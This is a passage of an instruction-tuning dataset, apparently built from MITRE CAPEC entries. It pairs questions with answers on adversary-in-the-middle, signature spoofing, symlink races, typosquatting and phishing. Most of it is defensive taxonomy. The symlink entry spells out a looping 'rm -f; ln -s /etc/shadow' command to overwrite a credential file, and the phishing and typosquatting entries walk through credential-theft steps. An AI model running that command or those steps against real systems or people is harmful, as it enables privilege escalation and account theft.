        "@Name": "Adversary in the Middle (AiTM)",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary targets the communication between two components (typically client and server), in order to alter or obtain data from transactions. A general approach entails the adversary placing themself within the communication channel between the two components."
        },
        "Extended_Description": {
          "xhtml:p": [
            "Whenever one component attempts to communicate with the other (data flow, authentication challenges, etc.), the data first flows through the adversary, who has the opportunity to observe or alter it, before being passed on to the intended recipient as if it was never observed. This interposition is transparent leaving the two compromised components unaware of the potential corruption or leakage of their communications. The potential for these attacks yields an implicit lack of trust in communication or identify between two components.",
            "These attacks differ from Sniffing Attacks (CAPEC-157) since these attacks often modify the communications prior to delivering it to the intended recipient."
          ]
        },
        "Alternate_Terms": {
          "Alternate_Term": [
            {
              "Term": "Man-in-the-Middle / MITM"
            },
            {
              "Term": "Person-in-the-Middle / PiTM"
            },
            {
              "Term": "Monkey-in-the-Middle"
            },
            {
              "Term": "Monster-in-the-Middle"
            },
            {
              "Term": "On-path Attacker"
            }
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "668"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine Communication Mechanism] The adversary determines the nature and mechanism of communication between two components, looking for opportunities to exploit.",
              "Technique": [
                "Perform a sniffing attack and observe communication to determine a communication protocol.",
                "Look for application documentation that might describe a communication mechanism used by a target."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Position In Between Targets] The adversary inserts themself into the communication channel initially acting as a routing proxy between the two targeted components.",
              "Technique": [
                "Install spyware on a client that will intercept outgoing packets and route them to their destination as well as route incoming packets back to the client.",
                "Exploit a weakness in an encrypted communication mechanism to gain access to traffic. Look for outdated mechanisms such as SSL."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Use Intercepted Data Maliciously] The adversary observes, filters, or alters passed data of its choosing to gain access to sensitive information or to manipulate the actions of the two target components for their own purposes.",
              "Technique": "Prevent some messages from reaching their destination, causing a denial of service."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "There are two components communicating with each other.",
            "An attacker is able to identify the nature and mechanism of communication between the two target components.",
            "An attacker can eavesdrop on the communication between the target components.",
            "Strong mutual authentication is not used between the two target components yielding opportunity for attacker interposition.",
            "The communication occurs in clear (not encrypted) or with insufficient and spoofable encryption."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "This attack can get sophisticated since the attack may use cryptography."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Ensure Public Keys are signed by a Certificate Authority",
            "Encrypt communications using cryptography (e.g., SSL/TLS)",
            "Use Strong mutual authentication to always fully authenticate both ends of any communications channel.",
            "Exchange public keys using a secure channel"
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "In 2017, security researcher Jerry Decime discovered that Equifax mobile applications were not leveraging HTTPS in all areas. Although authentication was properly utilizing HTTPS, in addition to validating the root of trust of the server certificate, other areas of the application were using HTTP to communicate. Adversaries could then conduct MITM attacks on rogue WiFi or cellular networks and hijack the UX. This further allowed the adversaries to prompt users for sensitive data, which could then be obtained in the plaintext response. [REF-636]"
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "300"
            },
            {
              "@CWE_ID": "290"
            },
            {
              "@CWE_ID": "593"
            },
            {
              "@CWE_ID": "287"
            },
            {
              "@CWE_ID": "294"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1557",
              "Entry_Name": "Adversary-in-the-Middle"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Man-in-the-middle attack"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-553"
            },
            {
              "@External_Reference_ID": "REF-633"
            },
            {
              "@External_Reference_ID": "REF-634"
            },
            {
              "@External_Reference_ID": "REF-635"
            },
            {
              "@External_Reference_ID": "REF-636"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Examples-Instances, Related_Vulnerabilities"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Example_Instances, Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated @Abstraction, Description, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated @Name, @Status, Alternate_Terms, Description, Example_Instances, Execution_Flow, Mitigations, References, Related_Attack_Patterns, Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Execution_Flow, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2021-06-24",
            "#text": "Man in the Middle Attack"
          }
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Signature Spoofing by Improper Validation (CAPEC ID: 475)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: The Windows CryptoAPI (Crypt32.dll) was shown to be vulnerable to signature spoofing by failing to properly validate Elliptic Curve Cryptography (ECC) certificates. If the CryptoAPI's signature validator allows the specification of a nonstandard base point (G): \"An adversary can create a custom ECDSA certificate with an elliptic curve (ECC) signature that appears to match a known standard curve, like P-256 that includes a public key for an existing known trusted certificate authority, but which was in fact not signed by that certificate authority. Windows checks the public key and other curve parameters, but not the (bespoke adversary-supplied) base point generator (G) parameter constant which actually generated the curve\" [REF-562]. Exploiting this vulnerability allows the adversary to leverage a spoofed certificate to dupe trusted network connections and deliver/execute malicious code, while appearing as legitimately trusted entity [REF-563]. This ultimately tricks the victim into believing the malicious website or executable is legitimate and originates from a properly verified source. See also: CVE-2020-0601",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The Windows CryptoAPI (Crypt32.dll) was shown to be vulnerable to signature spoofing by failing to properly validate Elliptic Curve Cryptography (ECC) certificates. If the CryptoAPI's signature validator allows the specification of a nonstandard base point (G): \"An adversary can create a custom ECDSA certificate with an elliptic curve (ECC) signature that appears to match a known standard curve, like P-256 that includes a public key for an existing known trusted certificate authority, but which was in fact not signed by that certificate authority. Windows checks the public key and other curve parameters, but not the (bespoke adversary-supplied) base point generator (G) parameter constant which actually generated the curve\" [REF-562]. Exploiting this vulnerability allows the adversary to leverage a spoofed certificate to dupe trusted network connections and deliver/execute malicious code, while appearing as legitimately trusted entity [REF-563]. This ultimately tricks the victim into believing the malicious website or executable is legitimate and originates from a properly verified source. See also: CVE-2020-0601",
      "@Name": "Signature Spoofing by Improper Validation (CAPEC ID: 475)",
      "attack_ptrn": {
        "@ID": "475",
        "@Name": "Signature Spoofing by Improper Validation",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary exploits a cryptographic weakness in the signature verification algorithm implementation to generate a valid signature without knowing the key.",
        "Extended_Description": {
          "xhtml:p": [
            "Signature verification algorithms are generally used to determine whether a certificate or piece of code (e.g. executable, binary, etc.) possesses a valid signature and can be trusted.",
            "If the leveraged algorithm confirms that a valid signature exists, it establishes a foundation of trust that is further conveyed to the end-user when interacting with a website or application. However, if the signature verification algorithm improperly validates the signature, either by not validating the signature at all or by failing to fully validate the signature, it could result in an adversary generating a spoofed signature and being classified as a legitimate entity. Successfully exploiting such a weakness could further allow the adversary to reroute users to malicious sites, steals files, activates microphones, records keystrokes and passwords, wipes disks, installs malware, and more."
          ]
        },
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "473"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "542"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Recipient is using a weak cryptographic signature verification algorithm or a weak implementation of a cryptographic signature verification algorithm, or the configuration of the recipient's application accepts the use of keys generated using cryptographically weak signature verification algorithms."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Cryptanalysis of signature verification algorithm"
            },
            {
              "@Level": "High",
              "#text": "Reverse engineering and cryptanalysis of signature verification algorithm implementation"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Use programs and products that contain cryptographic elements that have been thoroughly tested for flaws in the signature verification routines."
        },
        "Example_Instances": {
          "Example": "The Windows CryptoAPI (Crypt32.dll) was shown to be vulnerable to signature spoofing by failing to properly validate Elliptic Curve Cryptography (ECC) certificates. If the CryptoAPI's signature validator allows the specification of a nonstandard base point (G): \"An adversary can create a custom ECDSA certificate with an elliptic curve (ECC) signature that appears to match a known standard curve, like P-256 that includes a public key for an existing known trusted certificate authority, but which was in fact not signed by that certificate authority. Windows checks the public key and other curve parameters, but not the (bespoke adversary-supplied) base point generator (G) parameter constant which actually generated the curve\" [REF-562]. Exploiting this vulnerability allows the adversary to leverage a spoofed certificate to dupe trusted network connections and deliver/execute malicious code, while appearing as legitimately trusted entity [REF-563]. This ultimately tricks the victim into believing the malicious website or executable is legitimate and originates from a properly verified source. See also: CVE-2020-0601"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "347"
            },
            {
              "@CWE_ID": "327"
            },
            {
              "@CWE_ID": "295"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-562"
            },
            {
              "@External_Reference_ID": "REF-563"
            },
            {
              "@External_Reference_ID": "REF-564"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Example_Instances, References, Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Leveraging Race Conditions via Symbolic Links (CAPEC ID: 27)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Leveraging Race Conditions via Symbolic Links (CAPEC ID: 27) are: GNU \"ed\" utility (before 0.3) allows local users to overwrite arbitrary files via a symlink attack on temporary files, possibly in the open_sbuf function. See also: CVE-2006-6939\n- OpenmosixCollector and OpenMosixView in OpenMosixView 1.5 allow local users to overwrite or delete arbitrary files via a symlink attack on (1) temporary files in the openmosixcollector directory or (2) nodes.tmp. See also: CVE-2005-0894\n- Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails. See also: CVE-2000-0972",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "GNU \"ed\" utility (before 0.3) allows local users to overwrite arbitrary files via a symlink attack on temporary files, possibly in the open_sbuf function. See also: CVE-2006-6939",
        "OpenmosixCollector and OpenMosixView in OpenMosixView 1.5 allow local users to overwrite or delete arbitrary files via a symlink attack on (1) temporary files in the openmosixcollector directory or (2) nodes.tmp. See also: CVE-2005-0894",
        "Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails. See also: CVE-2000-0972"
      ],
      "@Name": "Leveraging Race Conditions via Symbolic Links (CAPEC ID: 27)",
      "attack_ptrn": {
        "@ID": "27",
        "@Name": "Leveraging Race Conditions via Symbolic Links",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack leverages the use of symbolic links (Symlinks) in order to write to sensitive files. An attacker can create a Symlink link to a target file not otherwise accessible to them. When the privileged program tries to create a temporary file with the same name as the Symlink link, it will actually write to the target file pointed to by the attackers' Symlink link. If the attacker can insert malicious content in the temporary file they will be writing to the sensitive file by using the Symlink. The race occurs because the system checks if the temporary file exists, then creates the file. The attacker would typically create the Symlink during the interval between the check and the creation of the temporary file.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "29"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Verify that target host's platform supports symbolic links.] This attack pattern is only applicable on platforms that support symbolic links.",
              "Technique": [
                "Research target platform to determine whether it supports symbolic links.",
                "Create a symbolic link and ensure that it works as expected on the given platform."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Examine application's file I/O behavior] Analyze the application's file I/O behavior to determine where it stores files, as well as the operations it performs to read/write files.",
              "Technique": [
                "Use kernel tracing utility such as ktrace to monitor application behavior.",
                "Use debugging utility such as File Monitor to monitor the application's filesystem I/O calls",
                "Watch temporary directories to see when temporary files are created, modified and deleted.",
                "Analyze source code for open-source systems like Linux, Apache, etc."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Verify ability to write to filesystem] The attacker verifies ability to write to the target host's file system.",
              "Technique": [
                "Create a file that does not exist in the target directory (e.g. \"touch temp.txt\" in UNIX-like systems)",
                "On platforms that differentiate between file creation and file modification, if the target file that the application writes to already exists, attempt to modify it.",
                "Verify permissions on target directory"
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Replace file with a symlink to a sensitive system file.] Between the time that the application checks to see if a file exists (or if the user has access to it) and the time the application actually opens the file, the attacker replaces the file with a symlink to a sensitive system file.",
              "Technique": [
                "Create an infinite loop containing commands such as \"rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat\". Wait for an instance where the following steps occur in the given order: (1) Application ensures that tempfile.dat exists and that the user has access to it, (2) \"rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat\", and (3) Application opens tempfile.dat for writing, and inadvertently opens /etc/shadow for writing instead.",
                "Use other techniques with debugging tools to replace the file between the time the application checks the file and the time the application opens it."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The attacker is able to create Symlink links on the target host.",
            "Tainted data from the attacker is used and copied to temporary files.",
            "The target host does insecure temporary file creation."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "This attack is sophisticated because the attacker has to overcome a few challenges such as creating symlinks on the target host during a precise timing, inserting malicious data in the temporary file and have knowledge about the temporary files created (file name and function which creates them)."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Availability",
              "Impact": "Resource Consumption",
              "Note": "Denial of Service"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Use safe libraries when creating temporary files. For instance the standard library function mkstemp can be used to safely create temporary files. For shell scripts, the system utility mktemp does the same thing.",
            "Access to the directories should be restricted as to prevent attackers from manipulating the files. Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file.",
            "Follow the principle of least privilege when assigning access rights to files.",
            "Ensure good compartmentalization in the system to provide protected areas that can be trusted."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": [
                "In this naive example, the Unix program foo is setuid. Its function is to retrieve information for the accounts specified by the user. For \"efficiency,\" it sorts the requested accounts into a temporary file (/tmp/foo naturally) before making the queries.",
                "The directory /tmp is world-writable. The malicious user creates a symbolic link to the file /.rhosts named /tmp/foo. Then, they invokes foo with \"user\" as the requested account. The program creates the (temporary) file /tmp/foo (really creating /.rhosts) and puts the requested account (e.g. \"user password\")) in it. It removes the temporary file (merely removing the symbolic link).",
                "Now the /.rhosts contains + +, which is the incantation necessary to allow anyone to use rlogin to log into the computer as the superuser.",
                "[REF-115]"
              ]
            },
            "GNU \"ed\" utility (before 0.3) allows local users to overwrite arbitrary files via a symlink attack on temporary files, possibly in the open_sbuf function. See also: CVE-2006-6939",
            "OpenmosixCollector and OpenMosixView in OpenMosixView 1.5 allow local users to overwrite or delete arbitrary files via a symlink attack on (1) temporary files in the openmosixcollector directory or (2) nodes.tmp. See also: CVE-2005-0894",
            "Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails. See also: CVE-2000-0972"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "367"
            },
            {
              "@CWE_ID": "61"
            },
            {
              "@CWE_ID": "662"
            },
            {
              "@CWE_ID": "689"
            },
            {
              "@CWE_ID": "667"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-115",
              "@Section": "Symlink race"
            },
            {
              "@External_Reference_ID": "REF-116"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, Examples-Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - TypoSquatting (CAPEC ID: 630)",
    "context": "",
    "output": "An adversary sends an email, impersonating paypal.com, to a user stating that they have just received a money transfer and to click the given link to obtain their money.\n- However, the link the in email is paypa1.com instead of paypal.com, which the user clicks without fully reading the link.\n- The user is directed to the adversary's website, which appears as if it is the legitimate paypal.com login page.\n- The user thinks they are logging into their account, but have actually just given their paypal credentials to the adversary. The adversary can now use the user's legitimate paypal credentials to log into the user's account and steal any money which may be in the account.\n- TypoSquatting vulnerability allows an adversary to impersonate a trusted domain and trick a user into visiting the malicious website to steal user credentials.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An adversary sends an email, impersonating paypal.com, to a user stating that they have just received a money transfer and to click the given link to obtain their money.",
        "However, the link the in email is paypa1.com instead of paypal.com, which the user clicks without fully reading the link.",
        "The user is directed to the adversary's website, which appears as if it is the legitimate paypal.com login page.",
        "The user thinks they are logging into their account, but have actually just given their paypal credentials to the adversary. The adversary can now use the user's legitimate paypal credentials to log into the user's account and steal any money which may be in the account.",
        "TypoSquatting vulnerability allows an adversary to impersonate a trusted domain and trick a user into visiting the malicious website to steal user credentials."
      ],
      "@Name": "TypoSquatting (CAPEC ID: 630)",
      "attack_ptrn": {
        "@ID": "630",
        "@Name": "TypoSquatting",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary registers a domain name with at least one character different than a trusted domain. A TypoSquatting attack takes advantage of instances where a user mistypes a URL (e.g. www.goggle.com) or not does visually verify a URL before clicking on it (e.g. phishing attack). As a result, the user is directed to an adversary-controlled destination. TypoSquatting does not require an attack against the trusted domain or complicated reverse engineering.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "616",
              "Exclude_Related": [
                {
                  "@Exclude_ID": "437"
                },
                {
                  "@Exclude_ID": "512"
                },
                {
                  "@Exclude_ID": "513"
                },
                {
                  "@Exclude_ID": "515"
                }
              ]
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "89"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "543"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.",
              "Technique": "Research popular or high traffic websites."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the TypoSquatted URL.",
              "Technique": "Register the TypoSquatted domain."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the TypoSquatted domain.",
              "Technique": [
                "Execute a phishing attack and send a user an e-mail convincing the user to click on a link leading the user to the TypoSquatted domain.",
                "Assume that a user will incorrectly type the legitimate URL, leading the user to the TypoSquatted domain."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Adversaries must be able to register DNS hostnames/URL\u2019s."
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Other",
            "Impact": "Other",
            "Note": "Depending on the intention of the adversary, a successful TypoSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Authenticate all servers and perform redundant checks when using DNS hostnames.",
            "Purchase potential TypoSquatted domains and forward to legitimate domain."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "An adversary sends an email, impersonating paypal.com, to a user stating that they have just received a money transfer and to click the given link to obtain their money.",
              "However, the link the in email is paypa1.com instead of paypal.com, which the user clicks without fully reading the link.",
              "The user is directed to the adversary's website, which appears as if it is the legitimate paypal.com login page.",
              "The user thinks they are logging into their account, but have actually just given their paypal credentials to the adversary. The adversary can now use the user's legitimate paypal credentials to log into the user's account and steal any money which may be in the account.",
              "TypoSquatting vulnerability allows an adversary to impersonate a trusted domain and trick a user into visiting the malicious website to steal user credentials."
            ]
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-491"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Phishing (CAPEC ID: 98)",
    "context": "",
    "output": "Possible examples: The target gets an official looking e-mail from their bank stating that their account has been temporarily locked due to suspected unauthorized activity and that they need to click on the link included in the e-mail to log in to their bank account in order to unlock it. The link in the e-mail looks very similar to that of their bank and once the link is clicked, the log in page is the exact replica. The target supplies their login credentials after which they are notified that their account has now been unlocked and that everything is fine. An attacker has just collected the target's online banking information which can now be used by the attacker to log into the target's bank account and transfer money to a bank account of the attackers' choice.\nAn adversary may use BlueJacking, or Bluetooth Phishing to send unsolicited contact cards, messages, or pictures to nearby devices that are listening via Bluetooth. These messages may contain phishing content.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "The target gets an official looking e-mail from their bank stating that their account has been temporarily locked due to suspected unauthorized activity and that they need to click on the link included in the e-mail to log in to their bank account in order to unlock it. The link in the e-mail looks very similar to that of their bank and once the link is clicked, the log in page is the exact replica. The target supplies their login credentials after which they are notified that their account has now been unlocked and that everything is fine. An attacker has just collected the target's online banking information which can now be used by the attacker to log into the target's bank account and transfer money to a bank account of the attackers' choice.",
        "An adversary may use BlueJacking, or Bluetooth Phishing to send unsolicited contact cards, messages, or pictures to nearby devices that are listening via Bluetooth. These messages may contain phishing content."
      ],
      "@Name": "Phishing (CAPEC ID: 98)",
      "attack_ptrn": {
        "@ID": "98",
        "@Name": "Phishing",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "Phishing is a social engineering technique where an attacker masquerades as a legitimate entity with which the victim might do business in order to prompt the user to reveal some confidential information (very frequently authentication credentials) that can later be used by an attacker. Phishing is essentially a form of information gathering or \"fishing\" for information.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "151",
              "Exclude_Related": [
                {
                  "@Exclude_ID": "515"
                },
                {
                  "@Exclude_ID": "512"
                },
                {
                  "@Exclude_ID": "513"
                }
              ]
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "89"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "543"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "611"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "630"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "631"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "632"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the attacker impersonate the legitimate site more convincingly. The attacker can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.",
              "Technique": [
                "Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L)",
                "Optionally obtain a legitimate SSL certificate for the new domain name."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Explore legitimate website and create duplicate] An attacker creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.",
              "Technique": [
                "Use spidering software to get copy of web pages on legitimate site.",
                "Manually save copies of required web pages from legitimate site.",
                "Create new web pages that have the legitimate site's look and feel, but contain completely new content."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
